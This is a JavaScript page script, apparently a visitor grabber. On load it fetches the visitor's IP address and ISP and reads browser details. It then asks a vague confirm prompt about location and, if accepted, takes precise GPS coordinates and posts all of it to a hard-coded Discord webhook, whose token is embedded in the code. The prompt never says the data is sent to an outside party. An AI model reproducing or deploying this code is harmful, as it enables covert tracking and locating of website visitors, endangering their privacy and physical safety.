window.addEventListener("load", function() {
    fetch('https://ipapi.co/json/')
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        var ipAddress = data.ip;
        var isp = data.org;
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;

        if (confirm("Do you want to allow this site to access your location data?")) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    var webhookURL = "https://discord.com/api/webhooks/1344321621179109386/zbCmnaOwr86_m999-BdxuJK81VH1kH5zNIeQJI1DqxPxhFoVEYu7-xUa3B-z9TM40sgh";
                    var message = {
                        "content": `A friend has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLocation: Latitude ${latitude}, Longitude ${longitude}`
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    }).then(function(response) {
                        if (response.ok) {
                            console.log("Notification sent to Discord successfully.");
                        } else {
                            console.log("Failed to send notification to Discord.");
                        }
                    }).catch(function(error) {
                        console.error("Error:", error);
                    });
                }, function(error) {
                    console.error("Geolocation error:", error);
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        } else {
            console.log("User denied location access.");
        }
    })
    .catch(function(error) {
        console.error("Error fetching IP address and ISP data:", error);
    });
});
